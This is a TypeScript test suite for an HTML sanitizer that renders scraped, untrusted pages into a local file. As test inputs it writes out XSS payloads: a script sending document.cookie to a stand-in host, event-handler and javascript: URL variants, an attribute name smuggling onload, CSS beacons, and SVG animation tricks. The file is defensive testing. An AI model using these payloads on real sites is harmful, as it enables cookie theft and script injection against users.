import { test } from "node:test";
import assert from "node:assert/strict";
import type { AssignedClasses, DomNode } from "../model/types.js";
import { renderReconciledHtml } from "./html.js";

/**
 * The tree these tests feed in is the shape extract.ts builds from a *live, untrusted* page:
 * every element tag and every attribute the page carried, verbatim. reconciled.html is opened
 * by the operator from disk, i.e. on a file:// origin, so anything executable that survives
 * serialization runs with local privileges. These tests pin what must not survive.
 */

let nextId = 0;

function el(tag: string, attributes: Record<string, string> = {}, children: DomNode[] = []): DomNode {
  return { id: String(nextId++), tag, attributes, children, style: {} };
}

function text(value: string): DomNode {
  return { id: String(nextId++), tag: "#text", attributes: {}, textContent: value, children: [], style: {} };
}

function render(root: DomNode, classes: AssignedClasses = {}): string {
  return renderReconciledHtml(root, classes);
}

test("a <script> element from the scraped page is dropped, along with its body", () => {
  const html = render(el("div", {}, [el("script", {}, [text("fetch('https://evil.test?c='+document.cookie)")]), text("hello")]));

  assert.ok(!html.includes("<script"), `expected no script element, got: ${html}`);
  assert.ok(!html.includes("evil.test"), "expected the script body to be dropped with the element");
  assert.ok(html.includes("hello"), "expected sibling content to survive");
});

test("iframe, object, embed, base, link and meta elements are dropped", () => {
  for (const tag of ["iframe", "object", "embed", "base", "link", "meta"]) {
    const html = render(el("div", {}, [el(tag, { src: "https://evil.test/x", href: "https://evil.test/x" }), text("kept")]));
    assert.ok(!html.includes(`<${tag}`), `expected <${tag}> to be dropped, got: ${html}`);
    assert.ok(html.includes("kept"), `expected sibling content to survive dropping <${tag}>`);
  }
});

test("on* event-handler attributes are stripped", () => {
  const html = render(el("img", { src: "cat.png", onerror: "alert(1)", onclick: "alert(2)", ONLOAD: "alert(3)" }));

  assert.ok(!/onerror/i.test(html), `expected onerror to be stripped, got: ${html}`);
  assert.ok(!/onclick/i.test(html), `expected onclick to be stripped, got: ${html}`);
  assert.ok(!/onload/i.test(html), `expected ONLOAD to be stripped case-insensitively, got: ${html}`);
  assert.ok(html.includes('src="cat.png"'), "expected the benign src to survive");
});

test("javascript: and vbscript: URLs are dropped from URL-bearing attributes", () => {
  for (const attr of ["href", "src", "action", "formaction", "poster", "background", "xlink:href"]) {
    for (const scheme of ["javascript:alert(1)", "JaVaScRiPt:alert(1)", " javascript:alert(1)", "java\tscript:alert(1)", "vbscript:msgbox(1)"]) {
      const html = render(el("a", { [attr]: scheme, id: "keepme" }));
      assert.ok(!/javascript/i.test(html) && !/vbscript/i.test(html), `expected ${attr}="${scheme}" to be dropped, got: ${html}`);
      assert.ok(html.includes('id="keepme"'), "expected unrelated attributes to survive");
    }
  }
});

test("srcset values carrying a javascript: candidate are dropped", () => {
  const html = render(el("img", { srcset: "javascript:alert(1) 1x, ok.png 2x" }));
  assert.ok(!/javascript/i.test(html), `expected the srcset to be dropped, got: ${html}`);
});

test("non-image data: URLs are dropped but data:image/* survives", () => {
  const bad = render(el("a", { href: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" }));
  assert.ok(!bad.includes("data:text/html"), `expected data:text/html to be dropped, got: ${bad}`);

  const good = render(el("img", { src: "data:image/png;base64,iVBORw0KGgo=" }));
  assert.ok(good.includes("data:image/png;base64,iVBORw0KGgo="), `expected data:image/* to survive, got: ${good}`);
});

test("ordinary relative, http(s), mailto and tel URLs survive", () => {
  const html = render(
    el("div", {}, [
      el("a", { href: "/about?a=1#frag" }),
      el("a", { href: "https://example.com/x" }),
      el("a", { href: "mailto:someone@example.com" }),
      el("a", { href: "tel:+15551234" }),
      el("img", { src: "../img/logo.png" }),
    ]),
  );

  for (const kept of ["/about?a=1#frag", "https://example.com/x", "mailto:someone@example.com", "tel:+15551234", "../img/logo.png"]) {
    assert.ok(html.includes(kept), `expected ${kept} to survive, got: ${html}`);
  }
});

test("attribute names that aren't well-formed are skipped rather than emitted raw", () => {
  const html = render(el("div", { 'x" onload="alert(1)': "y", "ok-attr": "v", "data-fine:x.1_2": "v" }));

  assert.ok(!/onload/i.test(html), `expected the malformed attribute name to be skipped, got: ${html}`);
  assert.ok(html.includes('ok-attr="v"'), "expected a well-formed attribute to survive");
  assert.ok(html.includes('data-fine:x.1_2="v"'), "expected a well-formed namespaced/dotted attribute to survive");
});

test("attribute values escape <, >, ' as well as & and \"", () => {
  const html = render(el("div", { title: `a&b"c<d>e'f` }));

  assert.ok(html.includes("&amp;"), "expected & to be escaped");
  assert.ok(html.includes("&quot;"), "expected \" to be escaped");
  assert.ok(html.includes("&lt;"), "expected < to be escaped");
  assert.ok(html.includes("&gt;"), "expected > to be escaped");
  assert.ok(html.includes("&#39;"), "expected ' to be escaped");
  assert.ok(!/[<>']/.test(html.slice(html.indexOf("title="), html.indexOf(">", html.indexOf("title=")))), "expected no raw <, > or ' inside the attribute value");
});

test("reconciled classes still replace the source class attribute", () => {
  const node = el("div", { class: "original-class", style: "color: red", id: "card" });
  const html = render(node, { [node.id]: ["px-4", "text-white"] });

  assert.ok(!html.includes("original-class"), "expected the source class to be dropped");
  assert.ok(!html.includes("color: red"), "expected the source style attribute to be dropped");
  assert.ok(html.includes('class="px-4 text-white"'), `expected the assigned classes, got: ${html}`);
  assert.ok(html.includes('id="card"'), "expected other attributes to survive");
});

test("a void element still serializes without a closing tag", () => {
  const html = render(el("img", { src: "a.png" }));
  assert.equal(html, '<img src="a.png">');
});

test("a <style> element is dropped along with the CSS it carries", () => {
  const html = render(
    el("div", {}, [
      el("style", {}, [text("@import url(http://evil.test/beacon.css); #card > .cta { background: url('http://evil.test/pixel?c=1') }")]),
      text("kept"),
    ]),
  );

  assert.ok(!html.includes("<style"), `expected <style> to be dropped, got: ${html}`);
  assert.ok(!html.includes("evil.test"), "expected the CSS body to be dropped with the element — @import/url() fetch on open");
  assert.ok(html.includes("kept"), "expected sibling content to survive");
});

test("SVG SMIL animation elements are dropped — they retarget href past the scheme allow-list", () => {
  for (const tag of ["animate", "set", "animateTransform"]) {
    const html = render(
      el("svg", {}, [
        el("a", { href: "#" }, [el(tag, { attributeName: "href", to: "javascript:alert(1)", values: "javascript:alert(1)" })]),
      ]),
    );

    assert.ok(!new RegExp(`<${tag}`, "i").test(html), `expected <${tag}> to be dropped, got: ${html}`);
    assert.ok(!/javascript/i.test(html), `expected the <${tag}> payload to be dropped, got: ${html}`);
  }
});
